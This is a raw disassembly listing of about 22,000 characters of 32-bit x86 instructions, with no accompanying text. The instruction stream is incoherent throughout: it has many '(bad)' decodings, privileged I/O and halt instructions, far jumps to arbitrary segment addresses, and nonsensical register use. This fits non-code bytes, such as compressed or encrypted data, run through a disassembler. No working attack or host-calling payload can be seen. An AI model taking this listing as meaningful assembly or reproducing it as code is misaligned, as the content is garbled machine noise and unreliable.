  429f48:	dec    esi
  429f49:	mov    ds:0xfa83cecb,eax
  429f4e:	imul   DWORD PTR [ecx]
  429f50:	fdivr  QWORD PTR [esi-0x62b641b7]
  429f56:	imul   ebx,DWORD PTR [esi+0x7ab697aa],0x7e
  429f5d:	loope  0x429fac
  429f5f:	sbb    ch,BYTE PTR [eax+0x10]
  429f62:	pushf  
  429f63:	popa   
  429f64:	shl    DWORD PTR [edx+edx*2+0x1579e277],1
  429f6b:	ins    BYTE PTR es:[edi],dx
  429f6c:	retf   
  429f6d:	lods   al,BYTE PTR ds:[esi]
  429f6e:	mov    edx,0x7e1db334
  429f73:	adc    esi,DWORD PTR ds:0x4bf42080
  429f79:	stc    
  429f7a:	jae    0x429fd2
  429f7c:	sub    BYTE PTR [ebx+0x79173fc3],0x51
  429f83:	dec    ebx
  429f84:	mov    ah,0xda
  429f86:	hlt    
  429f87:	mov    eax,0x689bddf1
  429f8c:	jg     0x429f2f
  429f8e:	std    
  429f8f:	jg     0x429fb1
  429f91:	imul   ecx,DWORD PTR [esi+0x5aee85d1],0x8ba43f4d
  429f9b:	imul   edx,edx,0xf223e7c5
  429fa1:	mov    ecx,0xf4c164cd
  429fa6:	mov    bh,0x54
  429fa8:	inc    ecx
  429fa9:	xor    al,0xc1
  429fab:	cmp    eax,0x252d97a6
  429fb0:	pop    edi
  429fb1:	call   0xd401:0xb7788503
  429fb8:	and    BYTE PTR [ecx+0x4797ec5d],bl
  429fbe:	or     dl,dl
  429fc0:	sbb    cl,bh
  429fc2:	fwait
  429fc3:	retf   0x4d5c
  429fc6:	dec    ebp
  429fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fc8:	and    al,BYTE PTR [ebp+0xa]
  429fcb:	stos   DWORD PTR es:[edi],eax
  429fcc:	and    DWORD PTR [ecx+0x4216f3ea],ecx
  429fd2:	inc    eax
  429fd3:	xor    DWORD PTR [edi],0xae34e05d
  429fd9:	mov    al,ds:0x5ecffc3b
  429fde:	retf   0x2633
  429fe1:	lods   al,BYTE PTR ds:[esi]
  429fe2:	jb     0x42a02d
  429fe4:	jmp    0x55d76287
  429fe9:	mov    ds:0xb4b7ca39,al
  429fee:	sti    
  429fef:	bound  edi,QWORD PTR [ecx]
  429ff1:	iret   
  429ff2:	mov    edx,0x5a5d1183
  429ff7:	mov    esi,0xaee7991c
  429ffc:	adc    BYTE PTR [ebx-0x61],bh
  429fff:	xlat   BYTE PTR ds:[ebx]
  42a000:	into   
  42a001:	cdq    
  42a002:	dec    ebx
  42a003:	scas   al,BYTE PTR es:[edi]
  42a004:	mov    bh,0x98
  42a006:	test   al,0x43
  42a008:	and    DWORD PTR [ecx+0x21a327b0],edx
  42a00e:	test   al,0x5
  42a010:	jno    0x42a003
  42a012:	fucomp st(6)
  42a014:	ins    DWORD PTR es:[edi],dx
  42a015:	push   ss
  42a016:	in     al,dx
  42a017:	jno    0x42a00e
  42a019:	fadd   st(1),st
  42a01b:	and    dl,BYTE PTR [edx]
  42a01d:	rcl    BYTE PTR [edx+0x19],cl
  42a020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a021:	addr16 mov ch,0x8f
  42a024:	idiv   BYTE PTR [ebx]
  42a026:	mov    bl,0xa4
  42a028:	jno    0x42a099
  42a02a:	xor    eax,DWORD PTR [eiz*1+0x3eec4907]
  42a031:	and    BYTE PTR ds:0xd31917e4,0x7a
  42a038:	fwait
  42a039:	xlat   BYTE PTR ds:[ebx]
  42a03a:	mov    BYTE PTR [ebx+0x5dba9bf],dl
  42a040:	push   eax
  42a041:	outs   dx,BYTE PTR ds:[esi]
  42a042:	sub    al,0xfd
  42a044:	retf   0x3b5a
  42a047:	mov    al,ds:0xf6a53b81
  42a04c:	and    ecx,ecx
  42a04e:	mov    edi,ebp
  42a050:	add    cl,cl
  42a052:	sub    BYTE PTR [edi+0x36],ah
  42a055:	dec    eax
  42a056:	adc    BYTE PTR [edi+0x1f],bh
  42a059:	stc    
  42a05a:	pushf  
  42a05b:	sub    BYTE PTR [edx],dh
  42a05d:	das    
  42a05e:	lds    ebp,FWORD PTR [ebx-0x1b40d81e]
  42a064:	mov    esi,edi
  42a066:	addr16 or eax,0xf06e9575
  42a06c:	push   ebx
  42a06d:	push   ds
  42a06e:	inc    ebp
  42a06f:	lods   eax,DWORD PTR ds:[esi]
  42a070:	push   ss
  42a071:	leave  
  42a072:	inc    esp
  42a073:	jnp    0x42a005
  42a075:	(bad)  
  42a076:	sti    
  42a077:	inc    ebp
  42a078:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42a07a:	cmp    edi,ebp
  42a07c:	loope  0x42a001
  42a07e:	hlt    
  42a07f:	idiv   BYTE PTR [eax+0x203b53a4]
  42a085:	jns    0x42a075
  42a087:	or     ecx,DWORD PTR [esi]
  42a089:	(bad)  
  42a08a:	and    al,0xed
  42a08c:	xchg   esp,eax
  42a08d:	sbb    esp,DWORD PTR [ebp+0x38ac85ce]
  42a093:	call   0x117bcfb4
  42a098:	out    dx,al
  42a099:	or     bh,BYTE PTR [ebx+0x7a]
  42a09c:	push   ss
  42a09d:	lds    ebx,FWORD PTR [edx+0x3b]
  42a0a0:	loopne 0x42a0ea
  42a0a2:	mov    DWORD PTR [ecx-0x1511e2db],esi
  42a0a8:	sbb    eax,0xdf192fa
  42a0ad:	lea    edx,[ebp+ecx*4+0x5a76dbb6]
  42a0b4:	sub    esi,DWORD PTR [ebx-0x8a31f02]
  42a0ba:	lock mov ds:0xf793a275,al
  42a0c0:	lahf   
  42a0c1:	sahf   
  42a0c2:	ds cmp eax,0xedc94d57
  42a0c8:	mov    eax,0x7664be75
  42a0cd:	xor    bl,bh
  42a0cf:	or     BYTE PTR [ebp+0x69ece71f],dl
  42a0d5:	call   0x4a26:0xd92206aa
  42a0dc:	add    DWORD PTR [eax+ecx*2+0x42],eax
  42a0e0:	pop    esp
  42a0e1:	sahf   
  42a0e2:	retf   
  42a0e3:	xor    BYTE PTR [edi-0x47],ch
  42a0e6:	jmp    0x3c80:0x790f8d2d
  42a0ed:	fst    DWORD PTR ds:0xa258febc
  42a0f3:	jae    0x42a0c7
  42a0f5:	lahf   
  42a0f6:	sbb    ecx,DWORD PTR [edx]
  42a0f8:	les    ebx,FWORD PTR [eax]
  42a0fa:	ret    
  42a0fb:	outs   dx,DWORD PTR ds:[esi]
  42a0fc:	mov    ch,0x80
  42a0fe:	adc    al,0xe8
  42a100:	push   edi
  42a101:	pop    ss
  42a102:	mov    edx,0xf0b939fa
  42a107:	mov    al,0x9b
  42a109:	(bad)  
  42a10a:	imul   esp,DWORD PTR ds:0xf402fdf9,0xffffffb6
  42a111:	hlt    
  42a112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a113:	pmaxub mm3,QWORD PTR ds:0x6adc9966
  42a11a:	mov    bh,0x82
  42a11c:	push   0x85f4be7f
  42a121:	sub    bl,bh
  42a123:	fiadd  WORD PTR [ebp-0x5b0df7b6]
  42a129:	add    al,0x85
  42a12b:	(bad)  
  42a12c:	sbb    bl,BYTE PTR [ecx-0x1f088fa]
  42a132:	dec    ebx
  42a133:	ja     0x42a0de
  42a135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a136:	jmp    0x42a116
  42a138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a139:	push   ss
  42a13a:	data16 fadd st,st(7)
  42a13d:	adc    eax,0xd94da33d
  42a142:	enter  0x40c4,0x7b
  42a146:	inc    edx
  42a147:	or     bl,BYTE PTR [esi-0x4b174a05]
  42a14d:	fwait
  42a14e:	imul   ebp,DWORD PTR [esi-0x4f],0x46
  42a152:	inc    ecx
  42a153:	pop    ebx
  42a154:	adc    BYTE PTR [ebp-0x6],ch
  42a157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a158:	sub    al,0x7d
  42a15a:	mov    esp,0x4d792a64
  42a15f:	test   BYTE PTR [esi-0x60],dh
  42a162:	push   edi
  42a163:	pop    esp
  42a164:	add    DWORD PTR [ecx-0x1d282ae8],ebp
  42a16a:	loop   0x42a1d8
  42a16c:	xchg   DWORD PTR [edx-0x4f0d5b46],ebx
  42a172:	leave  
  42a173:	stos   BYTE PTR es:[edi],al
  42a174:	test   BYTE PTR [ebx+edi*1-0x27239fb9],ah
  42a17b:	(bad)  [esp+esi*8+0x45]
  42a17f:	fdivrp st(7),st
  42a181:	pop    esp
  42a182:	jae    0x42a1dc
  42a184:	jno    0x42a1f7
  42a186:	mov    esi,0x347346c4
  42a18b:	mov    DWORD PTR [ecx],ebx
  42a18d:	push   esi
  42a18e:	push   ecx
  42a18f:	mov    cs,WORD PTR [ebx-0x29]
  42a192:	mov    bl,0xcc
  42a194:	jns    0x42a159
  42a196:	arpl   ax,dx
  42a198:	fldenv [ebp+0x2f657694]
  42a19e:	xchg   ebp,eax
  42a19f:	call   0xd35598b5
  42a1a4:	and    eax,0xfeebf8cd
  42a1a9:	add    DWORD PTR [edi],ebp
  42a1ab:	test   BYTE PTR ds:0x19d86589,bl
  42a1b1:	dec    ebp
  42a1b2:	or     eax,0xaba1a0d5
  42a1b7:	sub    ecx,DWORD PTR [ebx]
  42a1b9:	dec    edi
  42a1ba:	fdivp  st(6),st
  42a1bc:	out    dx,al
  42a1bd:	ror    dh,cl
  42a1bf:	xor    eax,0x65048673
  42a1c4:	sbb    DWORD PTR [ecx+0x231ab477],esp
  42a1ca:	icebp  
  42a1cb:	jmp    0x42a19c
  42a1cd:	jmp    0x81668ddf
  42a1d2:	mov    bl,0x9b
  42a1d4:	or     bl,BYTE PTR [esi+ecx*4-0x78]
  42a1d8:	xchg   edi,eax
  42a1d9:	dec    edi
  42a1da:	mov    cl,0xb4
  42a1dc:	and    BYTE PTR [edi-0x28],al
  42a1df:	rcr    edi,0x9f
  42a1e2:	retf   
  42a1e3:	or     cx,WORD PTR [eax]
  42a1e6:	and    eax,0xc9c7ab2f
  42a1eb:	lods   eax,DWORD PTR ds:[esi]
  42a1ec:	mov    edi,0x9324e8b9
  42a1f1:	pop    eax
  42a1f2:	pop    ax
  42a1f4:	mov    ds:0x89f10b91,al
  42a1f9:	mov    ah,0x91
  42a1fb:	loopne 0x42a205
  42a1fd:	pop    ds
  42a1fe:	repz je 0x42a1be
  42a201:	inc    esi
  42a202:	sbb    ah,dh
  42a204:	pause  
  42a206:	push   ds
  42a207:	pop    ss
  42a208:	mov    edx,0x23c4ff1c
  42a20d:	cmc    
  42a20e:	dec    eax
  42a20f:	jns    0x42a1f7
  42a211:	xchg   ebx,eax
  42a212:	xchg   ebx,eax
  42a213:	ds mov ch,0x55
  42a216:	dec    ebp
  42a217:	jmp    0x42a1db
  42a219:	ins    DWORD PTR es:[edi],dx
  42a21a:	sub    al,0xa7
  42a21c:	push   cs
  42a21d:	stos   BYTE PTR es:[edi],al
  42a21e:	sbb    al,0x9
  42a220:	sub    DWORD PTR [edx+0x27a92613],esp
  42a226:	stos   DWORD PTR es:[edi],eax
  42a227:	aas    
  42a228:	adc    eax,0xe8eff3a3
  42a22d:	xchg   ebp,esi
  42a22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a230:	sbb    eax,0xba5ed369
  42a235:	icebp  
  42a236:	push   ebx
  42a237:	sbb    ch,BYTE PTR [edi]
  42a239:	mov    ebx,DWORD PTR [ebp+edx*2-0x47]
  42a23d:	mov    esp,0x7272b4ff
  42a242:	mov    al,0x7e
  42a244:	and    ch,BYTE PTR [ecx+0x463a9ac9]
  42a24a:	adc    al,0x25
  42a24c:	lods   eax,DWORD PTR ds:[esi]
  42a24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a24e:	sti    
  42a24f:	dec    esp
  42a250:	out    0x9a,al
  42a252:	outs   dx,DWORD PTR ds:[esi]
  42a253:	and    al,0x8a
  42a255:	mov    bh,0x47
  42a257:	dec    ebp
  42a258:	mov    cl,0xb5
  42a25a:	mov    al,0xc4
  42a25c:	into   
  42a25d:	daa    
  42a25e:	push   esi
  42a25f:	scas   eax,DWORD PTR es:[edi]
  42a260:	mov    BYTE PTR [ecx],0x6f
  42a263:	pop    ebx
  42a264:	jge    0x42a20e
  42a266:	add    ah,BYTE PTR [ecx+0x4d]
  42a269:	xlat   BYTE PTR ds:[ebx]
  42a26a:	jp     0x42a2d6
  42a26c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a26d:	pop    ebp
  42a26e:	mov    ebx,0x4c72134
  42a273:	popf   
  42a274:	xor    al,0xa0
  42a276:	imul   ecx,DWORD PTR [esi+0x4f],0x25
  42a27a:	xor    al,0xe5
  42a27c:	adc    DWORD PTR [edi-0x3c6bbdb],edx
  42a282:	inc    ecx
  42a283:	push   ebp
  42a284:	mov    ebp,0x69e4ce71
  42a289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a28a:	stos   DWORD PTR es:[edi],eax
  42a28b:	mov    cl,0x58
  42a28d:	dec    eax
  42a28e:	stc    
  42a28f:	enter  0xbb15,0x8
  42a293:	and    DWORD PTR [edi],0xffffff99
  42a296:	lods   al,BYTE PTR es:[esi]
  42a298:	cmp    DWORD PTR [edx],ebp
  42a29a:	cwde   
  42a29b:	add    al,0x24
  42a29d:	loopne 0x42a253
  42a29f:	xor    ch,dl
  42a2a1:	pushf  
  42a2a2:	fwait
  42a2a3:	mov    cs:0xaeab1f5,al
  42a2a9:	xchg   BYTE PTR [ebx-0x181fe6b7],bh
  42a2af:	adc    al,0xaf
  42a2b1:	pushf  
  42a2b2:	imul   esi,DWORD PTR [edx+0x79],0xe1ecfd86
  42a2b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2ba:	jnp    0x42a2a2
  42a2bc:	lods   eax,DWORD PTR ds:[esi]
  42a2bd:	jns    0x42a31b
  42a2bf:	adc    DWORD PTR ds:0x7496dca9,esp
  42a2c5:	inc    ecx
  42a2c6:	pop    esi
  42a2c7:	add    al,0xf3
  42a2c9:	mov    eax,ds:0xdbd59b1b
  42a2ce:	pusha  
  42a2cf:	retf   
  42a2d0:	and    esp,DWORD PTR [edx+0x2d]
  42a2d3:	scas   eax,DWORD PTR es:[edi]
  42a2d4:	sbb    eax,0x1662d759
  42a2d9:	sbb    esp,esi
  42a2db:	stos   DWORD PTR es:[edi],eax
  42a2dc:	cmp    edx,esi
  42a2de:	and    dl,ah
  42a2e0:	pop    ecx
  42a2e1:	jle    0x42a34f
  42a2e3:	fidiv  WORD PTR [ebx+0x4a8cb593]
  42a2e9:	sbb    BYTE PTR [ecx+0x27],dh
  42a2ec:	jp     0x42a27b
  42a2ee:	mov    bh,0xb4
  42a2f0:	push   esp
  42a2f1:	mov    ds:0x4e26db67,eax
  42a2f6:	frstor [ecx+0x75]
  42a2f9:	sahf   
  42a2fa:	stc    
  42a2fb:	lds    eax,FWORD PTR [edx*1+0x742b90ec]
  42a302:	and    eax,0xd8791cc5
  42a307:	mov    ecx,0xb9ba4a6
  42a30c:	push   0xbe88054d
  42a311:	cld    
  42a312:	sbb    BYTE PTR [edi-0x6b4c262b],ah
  42a318:	ror    DWORD PTR [edi],cl
  42a31a:	mov    dl,0x13
  42a31c:	push   ebp
  42a31d:	mov    ds:0xc400e8de,al
  42a322:	mov    ds:0xf5298ae6,al
  42a327:	cwde   
  42a328:	xor    DWORD PTR [ecx],esi
  42a32a:	sahf   
  42a32b:	je     0x42a2ea
  42a32d:	aad    0xb6
  42a32f:	and    al,0x45
  42a331:	ret    
  42a332:	jmp    0x2019:0x9168adf0
  42a339:	or     DWORD PTR ds:0x31d750b0,esp
  42a33f:	imul   BYTE PTR [edx-0x5c]
  42a342:	stos   DWORD PTR es:[edi],eax
  42a343:	sub    BYTE PTR [ebx+0x5786c093],bl
  42a349:	push   ebx
  42a34a:	sahf   
  42a34b:	in     al,0xf8
  42a34d:	iret   
  42a34e:	mov    DWORD PTR [ecx+ecx*1-0x7f30191e],0x8911bc83
  42a359:	xchg   DWORD PTR [ecx-0x422cb100],edi
  42a35f:	ficomp DWORD PTR [ebx]
  42a361:	mov    ecx,0x31be8973
  42a366:	or     eax,0xec8c8b4d
  42a36b:	sub    dh,BYTE PTR [ebx+0x62]
  42a36e:	cmp    DWORD PTR [edi],edi
  42a370:	cmc    
  42a371:	xor    bh,BYTE PTR [edx-0x72f8bd5a]
  42a377:	adc    al,0xc9
  42a379:	sti    
  42a37a:	mov    bh,0x94
  42a37c:	pop    edi
  42a37d:	(bad)  
  42a37e:	push   ebx
  42a37f:	(bad)  
  42a381:	jae    0x42a3fc
  42a383:	in     al,dx
  42a384:	aad    0x25
  42a386:	popf   
  42a387:	repnz out dx,eax
  42a389:	scas   al,BYTE PTR es:[edi]
  42a38a:	mov    edx,0x38279f07
  42a38f:	enter  0x2d2e,0xb9
  42a393:	xchg   esp,eax
  42a394:	mov    ch,0x45
  42a396:	adc    edi,DWORD PTR [esi-0x5b]
  42a399:	ret    0xea73
  42a39c:	or     al,0x4b
  42a39e:	pop    edx
  42a39f:	sbb    bl,BYTE PTR [ecx+edi*4]
  42a3a2:	dec    ecx
  42a3a3:	cmp    esp,DWORD PTR [esi+ecx*2-0x60642f7f]
  42a3aa:	pop    ebx
  42a3ab:	fldcw  WORD PTR [ecx-0x1cd74ae4]
  42a3b1:	push   ecx
  42a3b2:	push   eax
  42a3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3b4:	jmp    0x2087cc6f
  42a3b9:	xchg   edi,eax
  42a3ba:	test   al,0x82
  42a3bc:	int3   
  42a3bd:	mov    dl,0xee
  42a3bf:	aam    0xe1
  42a3c1:	sbb    edi,esp
  42a3c3:	adc    esp,esp
  42a3c5:	lea    edx,[eax-0x3d2cfc5a]
  42a3cb:	and    al,0x90
  42a3cd:	inc    edi
  42a3ce:	daa    
  42a3cf:	popa   
  42a3d0:	sbb    BYTE PTR [edi],dh
  42a3d2:	mov    ebx,0xbba1a3a2
  42a3d7:	sti    
  42a3d8:	xor    ecx,DWORD PTR [ecx+0x63]
  42a3db:	lahf   
  42a3dc:	or     BYTE PTR [edx-0x56dc760d],bh
  42a3e2:	xchg   ecx,eax
  42a3e3:	fs adc eax,0x6dece66
  42a3e9:	xchg   ecx,eax
  42a3ea:	sbb    al,0x90
  42a3ec:	data16 jge 0x42a3ef
  42a3ef:	sbb    cl,dl
  42a3f1:	ins    BYTE PTR es:[edi],dx
  42a3f2:	(bad)  
  42a3f4:	aad    0xbf
  42a3f6:	and    esi,edx
  42a3f8:	cmp    al,0xb
  42a3fa:	ins    BYTE PTR es:[edi],dx
  42a3fb:	fldcw  WORD PTR [eax+0x799097ad]
  42a401:	retf   0xeae0
  42a404:	pop    ss
  42a405:	mov    DWORD PTR [esi-0x3b],ecx
  42a408:	cmp    al,BYTE PTR [edx+0x6a]
  42a40b:	dec    eax
  42a40c:	sub    ebp,DWORD PTR [eax-0x5380bd75]
  42a412:	and    al,0x95
  42a414:	xlat   BYTE PTR ds:[ebx]
  42a415:	cmp    BYTE PTR [bp+di],0xcc
  42a419:	jg     0x42a3d1
  42a41b:	xor    al,0x9d
  42a41d:	mov    ebx,0x992526f3
  42a422:	xor    ch,dh
  42a424:	pusha  
  42a425:	jbe    0x42a406
  42a427:	dec    ebx
  42a428:	aad    0x6c
  42a42a:	xchg   ebx,eax
  42a42b:	jns    0x42a44a
  42a42d:	jns    0x42a480
  42a42f:	stos   DWORD PTR es:[edi],eax
  42a430:	inc    ebp
  42a431:	test   DWORD PTR [edx],0x9ba042a7
  42a437:	xlat   BYTE PTR ds:[ebx]
  42a438:	shr    BYTE PTR [ebp+0xb409124],1
  42a43e:	cs aad 0x8e
  42a441:	loopne 0x42a3f4
  42a443:	fs clc 
  42a445:	mov    cl,0xec
  42a447:	mov    esi,0x90ae49d9
  42a44c:	mov    WORD PTR [ecx+0x1357fcb8],?
  42a452:	inc    esi
  42a453:	out    0x25,eax
  42a455:	sbb    DWORD PTR [ebx+esi*1+0x25],esi
  42a459:	add    BYTE PTR [ebp+0x7d],0xfe
  42a45d:	fwait
  42a45e:	jnp    0x42a47b
  42a460:	scas   eax,DWORD PTR es:[edi]
  42a461:	ds retf 
  42a463:	jae    0x42a4b5
  42a465:	(bad)  
  42a466:	bound  ebx,QWORD PTR [esi]
  42a468:	sbb    esi,0xffffffb3
  42a46b:	hlt    
  42a46c:	gs inc eax
  42a46e:	popa   
  42a46f:	jnp    0x42a416
  42a471:	ret    
  42a472:	xchg   edi,eax
  42a473:	out    0x96,eax
  42a475:	xchg   esi,eax
  42a476:	and    DWORD PTR [ebx+0x4d7b4a06],esp
  42a47c:	nop
  42a47d:	mov    eax,ds:0xfc2dd24b
  42a482:	ds leave 
  42a484:	sbb    DWORD PTR [ebx+0x5b],esp
  42a487:	ins    DWORD PTR es:[edi],dx
  42a488:	pusha  
  42a489:	idiv   BYTE PTR [ebx+0x59e6f5f4]
  42a48f:	mov    dh,0x4a
  42a491:	outs   dx,BYTE PTR ds:[esi]
  42a492:	mov    al,0x84
  42a494:	sbb    ah,cl
  42a496:	cmp    DWORD PTR [ebp-0x2b],eax
  42a499:	leave  
  42a49a:	dec    esi
  42a49b:	jmp    0x2924:0x31991bfd
  42a4a2:	push   0x71
  42a4a4:	jp     0x42a45d
  42a4a6:	ficom  WORD PTR [eax-0x3f]
  42a4a9:	mov    eax,ds:0x55574ddb
  42a4ae:	outs   dx,BYTE PTR ds:[esi]
  42a4af:	cmc    
  42a4b0:	(bad)  
  42a4b1:	jb     0x42a51c
  42a4b3:	int3   
  42a4b4:	xchg   esi,eax
  42a4b5:	aad    0xbd
  42a4b7:	mov    ah,0xf3
  42a4b9:	loope  0x42a48a
  42a4bb:	inc    eax
  42a4bc:	xor    eax,0x47ef2f8c
  42a4c1:	xor    DWORD PTR [eax],ebx
  42a4c3:	mov    eax,0xa5b638bf
  42a4c8:	jmp    0x42a48a
  42a4ca:	mov    esp,0x90d92974
  42a4cf:	test   dh,0xe1
  42a4d2:	je     0x42a535
  42a4d4:	jmp    0x42a46f
  42a4d6:	add    eax,0x5f9d9aae
  42a4db:	adc    DWORD PTR [ecx],ebp
  42a4dd:	mov    esi,0x4fb144b1
  42a4e2:	cmp    al,0x96
  42a4e4:	lods   al,BYTE PTR gs:[esi]
  42a4e6:	mov    ds:0x9aee0cee,al
  42a4eb:	mov    ebx,0xe0ae392b
  42a4f0:	mov    edx,0x19f985fe
  42a4f5:	in     al,dx
  42a4f6:	add    edi,DWORD PTR [ebx-0x1a94b41b]
  42a4fc:	or     BYTE PTR [esi],0xdb
  42a4ff:	lock sbb eax,0xa574e6f9
  42a505:	and    ecx,DWORD PTR [eax]
  42a507:	cmp    BYTE PTR [ebx+0x62],dh
  42a50a:	jge    0x42a4f1
  42a50c:	inc    esi
  42a50d:	call   0xb5a2:0xb5293eb
  42a514:	and    ecx,DWORD PTR [ecx+0xe5cc66d]
  42a51a:	xlat   BYTE PTR ds:[ebx]
  42a51b:	adc    bh,BYTE PTR [esi-0x61]
  42a51e:	mov    ebx,0xcf64b9e6
  42a523:	sti    
  42a524:	mov    eax,ds:0x220cf08b
  42a529:	js     0x42a4dd
  42a52b:	hlt    
  42a52c:	test   DWORD PTR [esi+esi*4+0x5b9d4c27],edx
  42a533:	sti    
  42a534:	jmp    0xf091fe4b
  42a539:	and    al,0x3b
  42a53b:	push   es
  42a53c:	pop    ss
  42a53d:	fyl2x  
  42a53f:	jmp    0x42a4fc
  42a541:	push   ebp
  42a542:	mov    edx,0xeba1e73c
  42a547:	fisubr WORD PTR [edi]
  42a549:	inc    edi
  42a54a:	jno    0x42a561
  42a54c:	imul   edi,DWORD PTR [edx-0x5d31136f]
  42a553:	cmp    BYTE PTR [ebx],bl
  42a555:	adc    edi,DWORD PTR [edi-0x26d5e5c]
  42a55b:	jmp    0xd8f7e0d6
  42a560:	and    eax,0xa0184ccb
  42a565:	(bad)  
  42a566:	stc    
  42a567:	mov    bl,0x5e
  42a569:	cmp    eax,0xb224252c
  42a56e:	jmp    0x5621:0xeba2afa4
  42a575:	shl    DWORD PTR [edi-0x5c4547d1],cl
  42a57b:	(bad)  [edi+ebx*4]
  42a57e:	jnp    0x42a53a
  42a580:	jmp    0x92bbd4d8
  42a585:	das    
  42a586:	adc    DWORD PTR [ebp+0x7d],0xffffffa2
  42a58a:	fld    TBYTE PTR [ebx]
  42a58c:	test   DWORD PTR [edi+0xfc12374],ebx
  42a592:	out    dx,al
  42a593:	pop    edx
  42a594:	aas    
  42a595:	push   0x99c214d8
  42a59a:	or     DWORD PTR [edx-0x6],esi
  42a59d:	adc    eax,0x8268a6dc
  42a5a2:	mov    edx,0x5a3d8b6e
  42a5a7:	push   ds
  42a5a8:	pop    ds
  42a5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a5aa:	pop    ecx
  42a5ab:	mov    bl,0xe
  42a5ad:	std    
  42a5ae:	retf   0x60e8
  42a5b1:	add    bh,al
  42a5b3:	push   0x8
  42a5b5:	adc    al,ah
  42a5b7:	test   BYTE PTR [ecx+ebp*4-0xb],dl
  42a5bb:	mov    esi,0xf5ea9855
  42a5c0:	mov    ch,0x22
  42a5c2:	lods   eax,DWORD PTR ds:[esi]
  42a5c3:	out    dx,eax
  42a5c4:	sbb    DWORD PTR [edx+0x46],ecx
  42a5c7:	hlt    
  42a5c8:	and    eax,0x3d18149
  42a5cd:	sub    eax,ecx
  42a5cf:	or     DWORD PTR [eax+esi*4-0x75],0x4b
  42a5d4:	pop    esi
  42a5d5:	imul   esp,ecx,0xa
  42a5d8:	lea    ebp,[eax]
  42a5da:	jp     0x42a614
  42a5dc:	and    DWORD PTR [ecx+0x3],ebx
  42a5df:	into   
  42a5e0:	sbb    DWORD PTR [edi-0x5b1e15c8],ecx
  42a5e6:	fwait
  42a5e7:	xor    eax,DWORD PTR [ebp+0x66]
  42a5ea:	out    dx,eax
  42a5eb:	cmp    dh,BYTE PTR [ebx+0x16e8a2f3]
  42a5f1:	cdq    
  42a5f2:	xor    edi,DWORD PTR [ebp+eax*1+0x30]
  42a5f6:	lds    esi,FWORD PTR [ecx]
  42a5f8:	lahf   
  42a5f9:	xchg   esi,eax
  42a5fa:	jl     0x42a66a
  42a5fc:	cmc    
  42a5fd:	dec    edx
  42a5fe:	hlt    
  42a5ff:	scas   eax,DWORD PTR es:[edi]
  42a600:	cli    
  42a601:	sar    BYTE PTR [esi+0xb],cl
  42a604:	mov    al,ds:0x9c087399
  42a609:	jmp    0x42a5b1
  42a60b:	repz mov bh,0x9e
  42a60e:	mov    ebx,0x6ab08bec
  42a613:	adc    esp,DWORD PTR [ecx]
  42a615:	mov    bl,0x27
  42a617:	iret   
  42a618:	or     al,0x67
  42a61a:	mov    ch,0x84
  42a61c:	scas   al,BYTE PTR es:[edi]
  42a61d:	sub    al,0x95
  42a61f:	push   ebx
  42a620:	jne    0x42a64c
  42a622:	cmp    ah,dh
  42a624:	fwait
  42a625:	in     eax,0x17
  42a627:	pop    esp
  42a628:	sbb    al,0x9
  42a62a:	sub    ah,BYTE PTR [esi-0x25]
  42a62d:	ret    
  42a62e:	es int3 
  42a630:	inc    ebp
  42a631:	lahf   
  42a632:	jnp    0x42a606
  42a634:	sbb    eax,0x6f0dc0b0
  42a639:	rol    ah,1
  42a63b:	cs or  bl,al
  42a63e:	mov    ecx,0x44297204
  42a643:	adc    dh,BYTE PTR ds:0x92eab9b1
  42a649:	(bad)  
  42a64a:	xchg   edx,eax
  42a64b:	test   eax,0xba116948
  42a650:	nop
  42a651:	adc    al,BYTE PTR [esi]
  42a653:	(bad)  
  42a654:	(bad)  
  42a655:	(bad)  
  42a656:	inc    edx
  42a657:	outs   dx,BYTE PTR ds:[esi]
  42a658:	in     eax,0x70
  42a65a:	shl    dl,0x19
  42a65d:	call   0xc48e:0x3918a4a8
  42a664:	xor    cl,BYTE PTR [ebx-0x4b24b854]
  42a66a:	mov    edi,esi
  42a66c:	jb     0x42a67e
  42a66e:	mov    al,0x63
  42a670:	das    
  42a671:	idiv   BYTE PTR [eax-0x33128d92]
  42a677:	in     al,dx
  42a678:	or     DWORD PTR [ebx-0x192886c5],ebx
  42a67e:	push   ss
  42a67f:	bound  ecx,QWORD PTR [ecx+edx*1]
  42a682:	pop    esp
  42a683:	fs fwait
  42a685:	(bad)  
  42a686:	mov    al,ds:0x2835f073
  42a68b:	out    dx,eax
  42a68c:	and    bh,BYTE PTR [ecx-0x3e]
  42a68f:	sub    esp,DWORD PTR [edi-0x24f9571d]
  42a695:	sbb    ebp,esp
  42a697:	push   eax
  42a698:	dec    eax
  42a699:	xor    al,BYTE PTR [ebp+eax*1+0x46a0720a]
  42a6a0:	(bad)  
  42a6a1:	aad    0x4e
  42a6a3:	in     al,dx
  42a6a4:	scas   eax,DWORD PTR es:[edi]
  42a6a5:	fwait
  42a6a6:	fwait
  42a6a7:	inc    ebx
  42a6a8:	aas    
  42a6a9:	les    edx,FWORD PTR [eax+0x57]
  42a6ac:	mov    bh,0x8e
  42a6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6b1:	mov    ds:0x6c5164b9,eax
  42a6b6:	addr16 aam 0x5d
  42a6b9:	ins    BYTE PTR es:[edi],dx
  42a6ba:	aas    
  42a6bb:	lds    ebx,FWORD PTR [ebp-0x1d]
  42a6be:	adc    BYTE PTR [ebp+0x691b9b28],al
  42a6c4:	xchg   esi,eax
  42a6c5:	pop    ds
  42a6c6:	adc    ebx,DWORD PTR [esi]
  42a6c8:	test   BYTE PTR [ebx-0x2b],ah
  42a6cb:	or     eax,0x84bc4bab
